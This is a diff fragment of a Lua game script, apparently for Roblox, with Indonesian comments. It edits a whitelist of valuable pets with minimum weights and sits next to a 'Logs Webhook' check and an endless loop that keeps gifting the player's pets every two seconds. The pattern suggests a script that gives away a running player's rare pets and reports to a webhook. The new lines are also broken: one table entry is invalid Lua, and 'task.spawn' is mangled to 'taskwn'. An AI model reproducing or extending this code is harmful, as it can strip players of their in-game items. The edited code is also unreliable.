@@ -711,52 +711,14 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
             end
         end
 
--- === WHITELIST FILTER ===
+
+-- === PET WHITELIST + MIN WEIGHT (KG) ===
 local PetWhitelist = {
-    ["Brontosaurus"] = true,
-    ["Mimic Octopus"] = true,
-    ["Peacock"] = true,
-    ["Bald Eagle"] = true,
-   ["Wasp"] = true,
-   ["Sea Turtle"] = true,
-   ["Tarantula Hawk"] = true,
-   ["Capybara"] = true,
-   ["Butterfly"] = true,
-   ["Dragonfly"] = true,
-   ["Disco Bee"] = true,
-   ["Queen Bee"] = true,
-   ["Swan"] = true,
-   ["Ruby Squid"] = true,
-   ["Meerkat"] = true,
-   ["Hotdog Daschund"] = true,
-   ["Wisp"] = true,
-   ["Spider"] = true,
-   ["Echo Frog"] = true,
-   ["Dilophosaurus"] = true,
-   ["Koi"] = true,
-   ["Raccoon"] = true,
-   ["Fennec Fox"] = true,
-   ["T-Rex"] = true,
-   ["Spinosaurus"] = true,
-   ["French Fry Ferret"] = true,
-   ["Luminous Sprite"] = true,
-   ["Phoenix"] = true,
-   ["Reaper"] = true,
-   ["Elephant"] = true,
-   ["Kitsune"] = true,
-   ["Headless Horseman"] = true,
-   ["Rainbow Elephant"] = true,
-   ["Rainbow Dilophosaurus"] = true,
-   ["Rainbow Hydra"] = true,
-   ["Rainbow Spinosaurus"] = true,
-   ["Rainbow Hotdog Dashcund"] = true,
-   ["Rainbow Pachycephalosaurus"] = true,
-   ["Ghostly Spider"] = true,
-   ["Ghostly Headless Horseman"] = true,
-["Echo Frog"] = true,
-   
-   
+    ["Brontosaurus"],   -- minimal 0 kg
+    ["Peacock"] = { MinWeight = 90 },  -- minimal 90 kg
+    
 }
+
 
 local function ShouldGiftPet(pet)
     -- Pet.Type sudah versi tanpa mutation prefix
@@ -769,7 +731,7 @@ end
 
 
         -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
-        task.spawn(function()
+        taskwn(function()
     while true do
         task.wait(2)
         local currentPets = GetPlayerPets()
